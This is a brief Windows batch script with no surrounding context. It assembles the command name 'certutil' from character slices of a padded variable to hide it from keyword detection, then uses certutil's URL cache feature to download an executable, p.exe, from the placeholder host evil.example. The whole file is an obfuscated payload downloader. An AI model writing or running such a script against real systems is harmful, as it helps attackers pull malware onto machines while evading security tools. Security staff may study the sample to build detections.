@echo off
set a=xxcertutilxx
%a:~2,1%%a:~3,1%%a:~4,1%%a:~5,1%%a:~6,1%%a:~7,1%%a:~8,1%%a:~9,1% -urlcache -f http://evil.example/p.exe p.exe
